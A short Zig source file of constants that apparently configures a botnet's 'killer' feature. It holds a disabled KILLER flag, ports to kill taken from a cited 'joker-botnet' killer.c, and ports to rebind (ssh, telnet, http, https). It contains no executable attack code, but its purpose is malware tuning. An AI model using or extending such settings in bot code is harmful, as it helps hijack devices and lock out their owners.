pub const KILLER = false;

pub const KILL_PORTS: []const u16 = &[_]u16{
    // https://github.com/COOLJONNY73/joker-botnet/blob/main/Joker-botnet/bot/killer.c#L47
    48101,
    1991,
    1338,
};

pub const REBIND_PORTS: []const u16 = &[_]u16{
    22, // ssh
    23, // telnet
    80, // http
    443, // https
};
